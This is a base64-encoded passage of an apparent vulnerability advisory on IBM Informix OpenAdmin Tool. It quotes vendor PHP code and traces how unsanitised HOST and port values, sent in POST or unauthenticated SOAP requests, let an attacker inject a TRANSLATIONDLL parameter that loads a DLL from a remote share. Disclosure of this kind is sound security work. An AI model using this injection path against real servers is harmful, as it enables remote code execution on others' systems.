ZSBkbGwgZW50cnkgcG9pbnQgY29udGFpbnMgbWFsaWNpb3VzIGNvZGUsIHRoaXMgd2lsbCBiZSBleGVjdXRlZCBpbnN0YW50bHkuIFRoaXMgY2FuIGJlIGRvbmUgZXguIHRocm91Z2ggdGhlIOKAmEhPU1TigJggcGFyYW1ldGVyIG9mIGEgUE9TVCByZXF1ZXN0Lg0KDQpWdWxuZXJhYmxlIGNvZGUg4oCTIEM6XFByb2dyYW0gRmlsZXMgKHg4NilcSUJNIEluZm9ybWl4IFNvZnR3YXJlIEJ1bmRsZVxPQVRcQXBhY2hlXzIuMi4yMlxodGRvY3Ncb3BlbmFkbWluXG1vZHVsZXNcbG9naW4ucGhwDQoNCi4uLg0KZnVuY3Rpb24gdGVzdGNvbm4oJGludGVybmFsPWZhbHNlKQ0KCXsNCgkJJHN0YXRlID0gMTsNCgkJJHN0YXRlbWVzc2FnZT0iT25saW5lIjsNCgkJDQoJCSRzZXJ2ZXJuYW1lID0gJHRoaXMtPmlkc2FkbWluLT5pblsnU0VSVkVSJ107PC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIFsqXQ0KCQkkaG9zdCA9ICR0aGlzLT5pZHNhZG1pbi0+aW5bJ0hPU1QnXTsgPC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSANCgkJJHBvcnQgPSAkdGhpcy0+aWRzYWRtaW4tPmluWydQT1JUJ107IDwtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoJCSRwcm90b2NvbCA9ICR0aGlzLT5pZHNhZG1pbi0+aW5bJ0lEU1BST1RPQ09MJ107IDwtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCgkJLy8gVGhlIGJlbG93IGRpc3RpbmN0aW9uIChzeXNtYXN0ZXIvc3lzYWRtaW4pIGlzIG5lZWRlZCB0byBhdm9pZCB0aGUgZXJyb3IgKC01NzA6Q2Fubm90IHJlZmVyZW5jZSBhbiBleHRlcm5hbCBBTlNJIGRhdGFiYXNlLikgd2hlbiBhIHRlbmFudCBvd25lcidzIHBlcm1pc3Npb25zIGFyZSBiZWluZyB2ZXJpZmllZC4NCgkJLy8gVGhlIGVycm9yIGhhcHBlbnMgd2hlbiBjb25uZWN0aW5nIHRvIHN5c21hc3RlciBhbmQgaXNzdWluZyB0aGUgcXVlcnkgKGJlbG93LCBqb2luaW5nIHN5c2FkbWluOnBoX2FsbG93X2xpc3QgYW5kIDx0ZW5hbnRfZGI+OnN5c3VzZXJzKSB0byBjaGVjayBhZ2FpbnN0IHN5c3VzZXJzIG9uIGFuIGFuc2kgZGINCgkJaWYgKGlzc2V0KCR0aGlzLT5pZHNhZG1pbi0+aW5bJ1RFTkFOVF9EQk9XTkVSJ10pICYmICgkdGhpcy0+aWRzYWRtaW4tPmluWydURU5BTlRfREJPV05FUiddID09IDEgfHwgJHRoaXMtPmlkc2FkbWluLT5pblsnVEVOQU5UX0RCT1dORVInXSA9PSB0cnVlKSkgew0KCQkJJGRibmFtZSA9ICJzeXNhZG1pbiI7DQoJCX0gZWxzZSB7DQoJCQkkZGJuYW1lID0gInN5c21hc3RlciI7DQoJCX0NCgkJJHVzZXIgPSAkdGhpcy0+aWRzYWRtaW4tPmluWydVU0VSTkFNRSddOyA8LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCgkJJHBhc3N3ZCA9ICR0aGlzLT5pZHNhZG1pbi0+aW5bJ1BBU1NXT1JEJ107IDwtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoJCSRlbnZ2YXJzID0gKGlzc2V0KCR0aGlzLT5pZHNhZG1pbi0+aW5bJ0VOVlZBUlMnXSkpPyAkdGhpcy0+aWRzYWRtaW4tPmluWydFTlZWQVJTJ10gOiBudWxsOyANCg0KCQlyZXF1aXJlX29uY2UgKFJPT1RfUEFUSC4ibGliL1BET19PQVQucGhwIik7DQoJCXRyeSB7DQoJCQkkdGRiID0gbmV3IFBET19PQVQoJHRoaXMtPmlkc2FkbWluLCRzZXJ2ZXJuYW1lLCRob3N0LCRwb3J0LCRwcm90b2NvbCwkZGJuYW1lLCIiLCRlbnZ2YXJzLCR1c2VyLCRwYXNzd2QpOyA8LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gWyoqXQ0KCQl9IGNhdGNoKFBET0V4Y2VwdGlvbiAkZSkgew0KCQkJJG1lc3NhZ2U9cHJlZ19zcGxpdCgiLzovIiwkZS0+Z2V0TWVzc2FnZSgpKTsNCgkJCSRzdGF0ZW1lc3NhZ2U9ICRtZXNzYWdlW3NpemVvZigkbWVzc2FnZSktMV07DQoJCQkkc3RhdGVtZXNzYWdlPSJ7JHRoaXMtPmlkc2FkbWluLT5sYW5nKCdDb25uZWN0aW9uRmFpbGVkJyl9IHskc3RhdGVtZXNzYWdlfSI7DQoJCQkkc3RhdGU9MzsNCgkJfQ0KCQkNCgkJaWYgKGlzc2V0KCR0aGlzLT5pZHNhZG1pbi0+aW5bJ1RFTkFOVF9EQk9XTkVSJ10pICYmICgkdGhpcy0+aWRzYWRtaW4tPmluWydURU5BTlRfREJPV05FUiddID09IDEgfHwgJHRoaXMtPmlkc2FkbWluLT5pblsnVEVOQU5UX0RCT1dORVInXSA9PSAndHJ1ZScpKQ0KCQl7DQoJCQlpZiAoJHN0YXRlID09IDMpIHsNCgkJCQlpZiAoJGludGVybmFsKSB7DQoJCQkJCXJldHVybiAkc3RhdGVtZXNzYWdlOw0KCQkJCX0gZWxzZSB7DQoJCQkJCSR0ZGI9bnVsbDsNCgkJCQkJZWNobyAkc3RhdGVtZXNzYWdlOw0KCQkJCQlkaWUoKTsNCgkJCQl9DQoJCQl9DQoNCgkJCSRzcWwgPSAiU0VMRUNUIENPVU5UKCopIGFzIG5hbWVleGlzdHMgIiANCgkJCQkgICAuICJGUk9NIHN5c2FkbWluOnBoX2FsbG93X2xpc3QgYWwsIHskdGhpcy0+aWRzYWRtaW4tPmluWydURU5BTlRfREJOQU1FJ119OnN5c3VzZXJzIHN1ICIgDQoJCQkJICAgLiAiV0hFUkUgYWwubmFtZSA9ICd7JHRoaXMtPmlkc2FkbWluLT5pblsnVVNFUk5BTUUnXX0nICIgDQoJCQkJICAgLiAiQU5EIGFsLm5hbWUgPSBzdS51c2VybmFtZSAiIA0KCQkJCSAgIC4gIkFORCBzdS51c2VydHlwZSBJTiAoJ0QnLCdSJykgIg0KCQkJCSAgIC4gIkFORCBhbC5wZXJtX2xpc3QgTElLRSAnJXRlbmFudCUnOyI7DQoJCQkJICAgDQoJCQl0cnkgew0KCQkJCQkJCQ0KCQkJCSRzdG10ID0gJHRkYi0+cXVlcnkoJHNxbCxmYWxzZSx0cnVlKTsNCgkJCQkNCiAgICAJCX0gY2F0Y2ggKFBET0V4Y2VwdGlvbiAkZSkgew0KICAgIAkJCSRlcnJfY29kZSA9ICRlLT5nZXRDb2RlKCk7DQogICAgCQkJJGVycl9tc2cgPSAkZS0+Z2V0TWVzc2FnZSgpOw0KICAgIAkJCSRzdGF0ZW1lc3NhZ2UgPSAieyR0aGlzLT5pZHNhZG1pbi0+bGFuZygnQ29ubmVjdGlvbkZhaWxlZCcpfSB7JGVycl9jb2RlfTp7JGVycl9tc2d9IjsNCiAgICAJCQlpZiAoJGludGVybmFsKSB7DQoJCQkJCXJldHVybiAkc3RhdGVtZXNzYWdlOw0KCQkJCX0gZWxzZSB7DQoJCQkJCSR0ZGI9bnVsbDsNCgkJCQkJZWNobyAkc3RhdGVtZXNzYWdlOw0KCQkJCQlkaWUoKTsNCgkJCQl9DQogICAgCQl9DQogICAgCQkNCiAgICAJCSRyb3cgPSAkc3RtdC0+ZmV0Y2goKTsNCgkgICAgCSRzdG10LT5jbG9zZUN1cnNvcigpOw0KCSAgIA0KCSAgICAJaWYgKCAkcm93WydOQU1FRVhJU1RTJ10gPT0gMCApIHsNCgkgICAgCQkkc3RhdGVtZXNzYWdlID0gInskdGhpcy0+aWRzYWRtaW4tPmxhbmcoJ0luc3VmZmljaWVudFByaXZzJyl9IjsNCgkgICAgCX0NCgkgICAgCQ0KCSAgICAJaWYgKCRpbnRlcm5hbCkgew0KCQkJCXJldHVybiAkc3RhdGVtZXNzYWdlOw0KCQkJfSBlbHNlIHsNCgkJCQkkdGRiPW51bGw7DQoJCQkJZWNobyAkc3RhdGVtZXNzYWdlOw0KCQkJCWRpZSgpOw0KCQkJfSAgICAJCSAgICAJICAgIAkJICAgIAkJDQoJCX0NCgkJJHRkYj1udWxsOw0KCQllY2hvICRzdGF0ZW1lc3NhZ2U7DQoJCWRpZSgpOw0KCX0NCi4uLg0KDQpMZXTigJlzIGxvb2sgaW50byBDOlxQcm9ncmFtIEZpbGVzICh4ODYpXElCTSBJbmZvcm1peCBTb2Z0d2FyZSBCdW5kbGVcT0FUXEFwYWNoZV8yLjIuMjJcaHRkb2NzXG9wZW5hZG1pblxsaWJcUERPX09BVC5waHANCg0KLi4uDQpmdW5jdGlvbiBfX2NvbnN0cnVjdCgmJGlkc2FkbWluLCRzZXJ2ZXJuYW1lLCRob3N0LCRwb3J0LCRwcm90b2NvbCwkZGJuYW1lPSJzeXNtYXN0ZXIiLCRsb2NhbGU9IiIsJGVudnZhcnM9bnVsbCwkdXNlcm5hbWU9IiIsJHBhc3N3b3JkPSIiKQ0KCXsNCgkJJHRoaXMtPmlkc2FkbWluPSYkaWRzYWRtaW47DQoJCSR0aGlzLT5pZHNhZG1pbi0+bG9hZF9sYW5nKCJkYXRhYmFzZSIpOw0KCQkkdGhpcy0+ZGJuYW1lID0gJGRibmFtZTsNCgkJJGluZm9ybWl4ZGlyID0gJHRoaXMtPmlkc2FkbWluLT5nZXRfY29uZmlnKCJJTkZPUk1JWERJUiIpOw0KCQkNCgkJJGRzbiA9IHNlbGY6OmdldERTTigkc2VydmVybmFtZSwkaG9zdCwkcG9ydCwkcHJvdG9jb2wsJGluZm9ybWl4ZGlyLCRkYm5hbWUsJGxvY2FsZSwkZW52dmFycyk7IDwtLS0tLS0tLS0tLS0tLS0tLS0tLS0tIFsqKipdDQoJCQ0KCQlwdXRlbnYoIklORk9STUlYQ09OVElNRT17JHRoaXMtPmlkc2FkbWluLT5nZXRfY29uZmlnKCJJTkZPUk1JWENPTlRJTUUiLDIwKX0iKTsNCgkJcHV0ZW52KCJJTkZPUk1JWENPTlJFVFJZPXskdGhpcy0+aWRzYWRtaW4tPmdldF9jb25maWcoIklORk9STUlYQ09OUkVUUlkiLDMpfSIpOw0KICAgICAgICANCgkJcGFyZW50OjpfX2NvbnN0cnVjdCgkZHNuLCR1c2VybmFtZSx1dGY4X2RlY29kZSgkcGFzc3dvcmQpKTsgPC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIFsqKioqKl0NCgl9DQoNCnN0YXRpYyBmdW5jdGlvbiBnZXREU04gKCRzZXJ2ZXJuYW1lLCRob3N0LCRwb3J0LCRwcm90b2NvbCwkaW5mb3JtaXhkaXIsJGRibmFtZT0ic3lzbWFzdGVyIiwkbG9jYWxlPSIiLCRlbnZ2YXJzPW51bGwpDQoJew0KCQkkZHNuID0gImluZm9ybWl4Omhvc3Q9eyRob3N0fSI7IDwtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gWyoqKipdDQoJCSRkc24gLj0gIjtzZXJ2aWNlPXskcG9ydH0iOw0KCQkkZHNuIC49ICI7ZGF0YWJhc2U9eyRkYm5hbWV9IjsNCgkJJGRzbiAuPSAiO3Byb3RvY29sPXskcHJvdG9jb2x9IjsNCgkJJGRzbiAuPSAiO3NlcnZlcj17JHNlcnZlcm5hbWV9IjsNCgkJDQoJCWlmICggc3Vic3RyKFBIUF9PUywwLDMpICE9ICJXSU4iICkNCgkJew0KCQkJJGxpYnN1ZmZpeCA9IChzdHJ0b3VwcGVyKHN1YnN0cihQSFBfT1MsMCwzKSkgPT0gIkRBUiIpPyAiZHlsaWIiOiJzbyI7DQoJCQkkZHNuIC49ICI7VFJBTlNMQVRJT05ETEw9eyRpbmZvcm1peGRpcn0vbGliL2VzcWwvaWdvNGEzMDQuIi4kbGlic3VmZml4Ow0KCQkJJGRzbiAuPSAiO0RyaXZlcj17JGluZm9ybWl4ZGlyfS9saWIvY2xpL2xpYmlmZG1yLiIuJGxpYnN1ZmZpeC4iOyI7DQoJCX0NCg0KCQlpZiAoIWlzX251bGwoJGVudnZhcnMpICYmICRlbnZ2YXJzICE9ICIiICkNCgkJew0KCQkJLy8gYWRkIGVudnZhcnMgdG8gY29ubmVjdGlvbiBzdHJpbmcNCgkJCSRkc24gLj0gIjskZW52dmFycyI7DQoJCX0NCg0KCQlpZiAoICRsb2NhbGUgIT0gIiIgKQ0KCQl7DQoJCQkvLyBDTElFTlRfTE9DQUxFIHNob3VsZCBhbHdheXMgYmUgVVRGLTggdmVyc2lvbiBvZiBkYXRhYnNlIGxvY2FsZQ0KCQkJJGNsaWVudF9sb2NhbGUgPSBzdWJzdHIoJGxvY2FsZSwwLHN0cnJwb3MoJGxvY2FsZSwiLiIpKSAuICIuVVRGOCI7DQoJCQkkZHNuIC49ICI7Q0xJRU5UX0xPQ0FMRT17JGNsaWVudF9sb2NhbGV9O0RCX0xPQ0FMRT17JGxvY2FsZX07IjsNCgkJfQ0KCQkNCgkJcmV0dXJuICRkc247DQoJfQ0KLi4uDQoNCkF0IFsqKipdIHRoZSBnZXREU04oKSBmdW5jdGlvbiBpcyBjYWxsZWQNCkF0IFsqKioqXSBhbmQgZm9sbG93aW5nIHZhcmlvdXMgcGFyYW1ldGVycyBhcmUgY29uY2F0ZW5hdGVkIGludG8gYSBjb25uZWN0aW9uIHN0cmluZyB3aXRob3V0IHByaW9yIHNhbml0aXphdGlvbiBhbmQgc2V0IHRvICRkc24NCkF0IFsqKioqKl0gdGhlIHJlc3VsdGluZyBjb25uZWN0aW9uIHN0cmluZyBpdOKAmXMgcGFzc2VkIHRvIFBETzo6X19jb25zdHJ1Y3QoKSwgcmVzdWx0aW5nIGluIHRoZSBkbGwgdG8gYmUgbG9hZGVkIGluc3RhbnRseS4NCg0KUmVtb3RlIERMTCBJbmplY3Rpb24gdGhhdCBsZWFkcyB0byByZW1vdGUgY29kZSBleGVjdXRpb24gKDIpDQpJQk0gSW5mb3JtaXggRHluYW1pYyBTZXJ2ZXIgRGV2ZWxvcGVyIGlzIHZ1bG5lcmFibGUgdG8gVW5hdXRoZW50aWNhdGlvbiBSZW1vdGUgRExMIEluamVjdGlvbiB0aGF0IGxlYWRzIHRvIHJlbW90ZSBjb2RlIGV4ZWN1dGlvbi4NCg0KQnkgc3VibWl0dGluZyBhIFNPQVAgcmVxdWVzdCB0byBvbGl0ZVNlcnZpY2UucGhwLCBzcGVjaWZ5aW5nIGV4LiB0aGUg4oCYY2FuQ29ubmVjdFRvSURT4oCYIG1ldGhvZCwgaXQgaXMgcG9zc2libGUgdG8gaW5qZWN0IGFyYml0cmFyeSBwYXJhbWV0ZXJzIGludG8gYQ0KZGF0YWJhc2UgY29ubmVjdGlvbiBzdHJpbmcgZm9yIHRoZSB1bmRlcmx5aW5nIEluZm9ybWl4IGRhdGFiYXNlLg0KDQpJdCBpcyBwb3NzaWJsZSB0byBpbmplY3QgZXguIHRoZSDigJhUUkFOU0xBVElPTkRMTOKAmCBwYXJhbWV0ZXIgYW5kLCBpZiB0aGlzIHBhcmFtZXRlciBwb2ludHMgdG8gYSBkbGwgaW50byBhbiBleGlzdGluZyByZW1vdGUgbmV0d29yaw0Kc2hhcmUsIHRoZSBkbGwgd2lsbCBiZSBpbmplY3RlZCBpbnRvIHRoZSByZW1vdGUgQXBhY2hlIHByb2Nlc3MuIElmIG1hbGljaW91cyBjb2RlIGlzIGNvbnRhaW5lZCBpbnRvIHRoZSBkbGwgZW50cnkgcG9pbnQsIHRoaXMgd2lsbA0KYmUgZXhlY3V0ZWQgaW5zdGFudGx5Lg0KDQpWdWxuZXJhYmxlIGNvZGUgaXMgbG9jYXRlZCBpbnNpZGUgdGhlIGdldERCQ29ubmVjdGlvbigpIGZ1bmN0aW9uIG9mIHRoZSB1bmRlcmx5aW5nIG9saXRlU2VydmVyLnBocCBQSFAgY2xhc3MsIHdoZXJlIGNvbm5lY3Rpb24gcGFyYW1ldGVycyBhcmUgY29uY2F0ZW5hdGVkIHdpdGhvdXQgcHJpb3Igc2FuaXRpemF0aW9uLg0KDQpWdWxuZXJhYmxlIGNvZGUg4oCTIEM6XFByb2dyYW0gRmlsZXMgKHg4NilcSUJNIEluZm9ybWl4IFNvZnR3YXJlIEJ1bmRsZVxPQVRcQXBhY2hlXzIuMi4yMlxodGRvY3Ncb3BlbmFkbWluXHNlcnZpY2VzXG9saXRlXG9saXRlU2VydmljZS5waHANCg0KLi4uDQo8P3BocA0KWy4uXQ0KDQokaW5pID0gaW5pX3NldCgic29hcC53c2RsX2NhY2hlX2VuYWJsZWQiLCIwIik7DQoNCnJlcXVpcmVfb25jZSgib2xpdGVTZXJ2ZXIucGhwIik7DQoNCiRzZXJ2ZXIgPSBuZXcgU29hcFNlcnZlcigib2xpdGUud3NkbCIpOw0KJHNlcnZlci0+c2V0Q2xhc3MoIm9saXRlU2VydmVyIik7DQppZiAoaXNzZXQoJEhUVFBfUkFXX1BPU1RfREFUQSkpIA0KCXsNCgkkcmVxdWVzdCA9ICRIVFRQX1JBV19QT1NUX0RBVEE7DQp9IGVsc2UgDQoJew0KCSRyZXF1ZXN0ID0gZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7DQp9DQoNCiRzZXJ2ZXItPmhhbmRsZSgkcmVxdWVzdCk7DQo/Pg0KLi4uDQoNClRoZSBTT0FQIGludGVyZmFjZSBjYW4gYmUgaW50ZXJyb2dhdGVkIHdpdGhvdXQgcHJpb3IgYXV0aGVudGljYXRpb24sIExldOKAmXMgdGFrZSBhIGxvb2sgaW50byDigJhjYW5Db25uZWN0VG9JRFPigJggbWV0aG9kIGluc2lkZQ0KQzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxJQk0gSW5mb3JtaXggU29mdHdhcmUgQnVuZGxlXE9BVFxBcGFjaGVfMi4yLjIyXGh0ZG9jc1xvcGVuYWRtaW5cc2VydmljZXNcb2xpdGVcb2xpdGVTZXJ2ZXIucGhwDQoNCi4uLg0KLyoqDQoJICogVmVyaWZ5IHRoYXQgYSBjb25uZWN0aW9uIHRvIHRoZSBzZXJ2ZXIgY2FuIGJlIG1hZGUuDQoJICogQHJldHVybiB0cnVlIGlmIGEgbmV3IFBETyBjYW4gYmUgY3JlYXRlZCBhbmQgc2VydmVyIHZlcnNpb24gaXMgPj0gMTEsIGZhbHNlIG90aGVyd2lzZQ0KCSAqLw0KCWZ1bmN0aW9uIGNhbkNvbm5lY3RUb0lEUygkc2VydmVyLCAkaG9zdCwgJHBvcnQsICRwcm90b2NvbCwgJHVzZXJuYW1lLCAkcGFzc3dvcmQsICRsYW5nPSJlbl9VUyIpDQoJew0KCQkkdGhpcy0+c2V0T0FUTGl0ZUxhbmcoJGxhbmcpOw0KCQkNCgkJJHNxbCA9ICJTRUxFQ1QgREJJTkZPKCd2ZXJzaW9uJywnbWFqb3InKSBBUyB2ZXJzIEZST00gc3lzaGFfdHlwZSAiOw0KCQkkdGhpcy0+aGFuZGxpbmdQRE9FeGNlcHRpb24gPSBUUlVFOw0KCQl0cnkNCgkJew0KCQkJJHRlbXAgPSAkdGhpcy0+ZG9EYXRhYmFzZVdvcmsoJHNxbCwgInN5c21hc3RlciIsICRzZXJ2ZXIsICRob3N0LCAkcG9ydCwgJHByb3RvY29sLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7IDwtLS0tLS0tLS0tLS0tIFsxXQ0KCQkJLyogc2V0IGhhbmRsaW5nUERPRXhjZXB0aW9uIGJhY2sgdG8gZmFsc2UgaW4gY2FzZSB0aGlzIGlzIHVzZWQgaW4gYSBtdWx0aSBjYWxsICovDQoJCQkkdGhpcy0+aGFuZGxpbmdQRE9FeGNlcHRpb24gPSBGQUxTRTsNCgkJfQ0KCQljYXRjaChQRE9FeGNlcHRpb24gJGUpDQoJCXsNCgkJCXJldHVybiBhcnJheSgiY2FuQ29ubmVjdCIgPT4gZmFsc2UsICJtZXNzYWdlIiA9PiAkZS0+Z2V0TWVzc2FnZSgpKTsNCgkJfQ0KCQljYXRjaChFeGNlcHRpb24gJGUxKQ0KCQl7DQoJCQkvL2Vycm9yX2xvZygiQ291bGQgbm90IGNvbm5lY3QsIHJldHVybmluZyBmYWxzZSIpOw0KCQkJcmV0dXJuIGFycmF5KCJjYW5Db25uZWN0IiA9PiBmYWxzZSwgIm1lc3NhZ2UiID0+ICRlMS0+Z2V0TWVzc2FnZSgpKTsNCgkJfQ0KCQkvL2Vycm9yX2xvZyh2YXJfZXhwb3J0KCR0ZW1wKSk7DQoJCS8vZXJyb3JfbG9nKCJ0ZW1wOiAiIC4gdmFyX2V4cG9ydCgkdGVtcFswXVsnVkVSUyddLCB0cnVlKSk7DQoJCWlmKCR0ZW1wWzBdWydWRVJTJ10gPCAxMSkNCgkJew0KCQkJcmV0dXJuIGFycmF5KCJjYW5Db25uZWN0IiA9PiBmYWxzZSwgIm1lc3NhZ2UiID0+ICR0aGlzLT5pZHNhZG1pbi0+bGFuZygnU2VydmVyVmVyc2lvbkxlc3NUaGFuMTEnKSk7DQoJCX0NCgkJZWxzZQ0KCQl7DQoJCQlyZXR1cm4gYXJyYXkoImNhbkNvbm5lY3QiID0+IHRydWUsICJtZXNzYWdlIiA9PiAiIik7DQoJCX0NCgl9DQouLi4NCg0KJHNlcnZlciwgJGhvc3QsICRwb3J0LCAkcHJvdG9jb2wgYXJlIHJlY2VpdmVkIGZyb20gdGhlIFNPQVAgcmVxdWVzdCBhbmQgdGhleSBhcmUgZnVsbHkgY29udHJvbGxlZDsNCmF0IFsxXSBkb0RhdGFiYXNlV29yaygpIGlzIGNhbGxlZCwgdGhlbiBsb29rOg0KDQouLi4NCi8qKg0KCSAqIFJ1bnMgcXVlcnkgb24gc3BlY2lmaWVkIGRhdGFiYXNlDQoJICogQHJldHVybiBhcnJheSBjb250YWluaW5nIGFsbCBzZWxlY3RlZCByZWNvcmRzDQoJICovDQoJcHJpdmF0ZSBmdW5jdGlvbiBkb0RhdGFiYXNlV29yaygkc2VsLCAkZGJuYW1lPSJzeXNtYXN0ZXIiLCAkc2VydmVyTmFtZSwgJGhvc3QsICRwb3J0LCAkcHJvdG9jb2wsICR1c2VyLCAkcGFzc3dvcmQsDQoJJHRpbWVvdXQgPSAxMCwgJGV4Y2VwdGlvbnM9ZmFsc2UsICRsb2NhbGU9TlVMTCkNCgl7DQoJCSRyZXQgPSBhcnJheSgpOw0KCQlpZiAoICR0aGlzLT51c2VTYW1lQ29ubmVjdGlvbiA9PSBudWxsICkNCgkJJGRiID0gJHRoaXMtPmdldERCQ29ubmVjdGlvbigkZGJuYW1lLCAkc2VydmVyTmFtZSwgJGhvc3QsICRwb3J0LCAkcHJvdG9jb2wsICR1c2VyLCAkcGFzc3dvcmQsICR0aW1lb3V0LCAkbG9jYWxlKTsgPC0tLS0tLS0tLS0tLS0tLS0tLS0tLSBbMl0NCgkJZWxzZQ0KCQkkZGIgPSAkdGhpcy0+dXNlU2FtZUNvbm5lY3Rpb247DQoNCgkJd2hpbGUgKDEgPT0gMSkNCgkJew0KCQkJJHN0bXQgPSAkZGItPnF1ZXJ5KCRzZWwpOyAvLyBub3QgcmVxdWlyZWQgYXMgdGhpcyBpcyB1c2luZyB0aGUgUERPLT5xdWVyeSBub3QgdGhlICRpZHNhZG1pbi0+ZGItPnF1ZXJ5ICxmYWxzZSwkZXhjZXB0aW9ucywkbG9jYWxlKTsNCg0KCQkJJGVyciA9ICRkYi0+ZXJyb3JJbmZvKCk7DQoJCQlpZiAoICRlcnJbMV0gIT0gMCApDQoJCQl7DQoJCQkJdHJpZ2dlcl9lcnJvcigieyRlcnJbMV19IC0geyRlcnJbMl19IixFX1VTRVJfRVJST1IpOw0KCQkJfQ0KCQkJDQoJCQl3aGlsZSAoJHJvdyA9ICRzdG10LT5mZXRjaChQRE86OkZFVENIX0FTU09DKSApDQoJCQl7DQoJCQkJJHJldFtdID0gJHJvdzsNCgkJCX0NCg0KCQkJJGVyciA9ICRkYi0+ZXJyb3JJbmZvKCk7DQoNCgkJCWlmICggJGVyclsyXSA9PSAwICkNCgkJCXsNCgkJCQkkc3RtdC0+Y2xvc2VDdXJzb3IoKTsNCgkJCQlicmVhazsNCgkJCX0NCgkJCWVsc2UNCgkJCXsNCgkJCQkkZXJyID0gIkVycm9yOiB7JGVyclsyXX0gLSB7JGVyclsxXX0iOw0KCQkJCSRzdG10LT5jbG9zZUN1cnNvcigpOw0KCQkJCXRyaWdnZXJfZXJyb3IoJGVycixFX1VTRVJfRVJST1IpOw0KCQkJCWNvbnRpbnVlOw0KCQkJfQ0KCQl9DQoJCXJldHVybiAkcmV0Ow0KCX0NCi4uLg0KDQpBdCBbMl0gZ2V0REJDb25uZWN0aW9uKCkgaXMgY2FsbGVkIHdpdGggY29udHJvbGxlZCBwYXJhbWV0ZXJzLCBmaW5hbGx5IGxvb2s6DQoNCi4uLg0KLyoqDQoJICogR2V0cyBjb25uZWN0aW9uIHRvIHNwZWNpZmllZCBkYXRhYmFzZQ0KCSAqLw0KCWZ1bmN0aW9uIGdldERCQ29ubmVjdGlvbigkZGJuYW1lLCAkc2VydmVyTmFtZSwgJGhvc3QsICRwb3J0LCAkcHJvdG9jb2wsICR1c2VyLCAkcGFzc3dvcmQsICR0aW1lb3V0ID0gMTAsICRsb2NhbGUgPSBudWxsKQ0KCXsNCgkJLy8kSU5GT1JNSVhDT05USU1FPTI7DQoJCSRJTkZPUk1JWENPTlJFVFJZPTEwOw0KCQlzZXR0eXBlKCR0aW1lb3V0LCAnaW50ZWdlcicpOw0KDQoJCXB1dGVudigiSU5GT1JNSVhDT05USU1FPXskdGltZW91dH0iKTsNCgkJcHV0ZW52KCJJTkZPUk1JWENPTlJFVFJZPXskSU5GT1JNSVhDT05SRVRSWX0iKTsNCg0KCQkkZHNuIC49ICJpbmZvcm1peDpob3N0PXskaG9zdH0iOyA8LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIFszXQ0KCQkkZHNuIC49ICI7c2VydmljZT17JHBvcnR9IjsgPC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCgkJJGRzbiAuPSAiO2RhdGFiYXNlPXskZGJuYW1lfSI7IDwtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCgkJJGRzbiAuPSAiO3Byb3RvY29sPXskcHJvdG9jb2x9IjsgPC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCgkJJGRzbiAuPSAiO3NlcnZlcj17JHNlcnZlck5hbWV9IjsgPC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCgkJJGRiID0gbnVsbDsNCg0KCQlpZihzdWJzdHIoUEhQX09TLDAsMykgIT0gIldJTiIpDQoJCXsNCgkJCSRpbmZvcm1peGRpciA9ICR0aGlzLT5pZHNhZG1pbi0+Z2V0X2NvbmZpZygiSU5GT1JNSVhESVIiKTsNCgkJCSRsaWJzdWZmaXggPSAoc3RydG91cHBlcihzdWJzdHIoUEhQX09TLDAsMykpID09ICJEQVIiKSA/ICJkeWxpYiIgOiAic28iOw0KCQkJJGRzbiAuPSAiO1RSQU5TTEFUSU9ORExMPXskaW5mb3JtaXhkaXJ9L2xpYi9lc3FsL2lnbzRhMzA0LiIuJGxpYnN1ZmZpeDsNCgkJCSRkc24gLj0gIjtEcml2ZXI9eyRpbmZvcm1peGRpcn0vbGliL2NsaS9saWJpZmRtci4iLiRsaWJzdWZmaXguIjsiOw0KCQl9DQoNCgkJaWYgKCAkbG9jYWxlICE9IG51bGwgKQ0KCQl7DQoJCQkkY2xpZW50X2xvY2FsZSA9IHN1YnN0cigkbG9jYWxlLDAsc3RycnBvcygkbG9jYWxlLCIuIikpIC4gIi5VVEY4IjsNCgkJCSRkc24gLj0gIjtDTElFTlRfTE9DQUxFPXskY2xpZW50X2xvY2FsZX07REJfTE9DQUxFPXskbG9jYWxlfTsiOw0KCQl9DQogICAgICAgDQoJCWlmICggJHRoaXMtPmhhbmRsaW5nUERPRXhjZXB0aW9uID09PSBGQUxTRSApDQoJCXsNCgkJCXRyeSB7DQoJCQkJJGRiID0gbmV3IFBETyAoInskZHNufSIsJHVzZXIsdXRmOF9kZWNvZGUoJHBhc3N3b3JkKSApOyA8LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSBbNF0gYm9vbSENCgkJCX0NCgkJCWNhdGNoICggUERPRXhjZXB0aW9uICRlICkNCgkJCXsNCgkJCQkvL2Vycm9yX2xvZyh2YXJfZXhwb3J0ICggJGRiLT5lcnJvckluZm8oKSAsIHRydWUgKSApOw0KCQkJCS8vdHJpZ2dlcl9lcnJvcigkZS0+Z2V0TWVzc2FnZSgpLEVfVVNFUl9FUlJPUik7DQoJCQkJJGV4Y2VwdGlvbiA9ICR0aGlzLT5wYXJzZVBET0V4Y2VwdGlvbigkZS0+Z2V0TWVzc2FnZSgpKTsNCgkJCQl0aHJvdyBuZXcgU29hcEZhdWx0KCJ7JGV4Y2VwdGlvblsnY29kZSddfSIsJGV4Y2VwdGlvblsnbWVzc2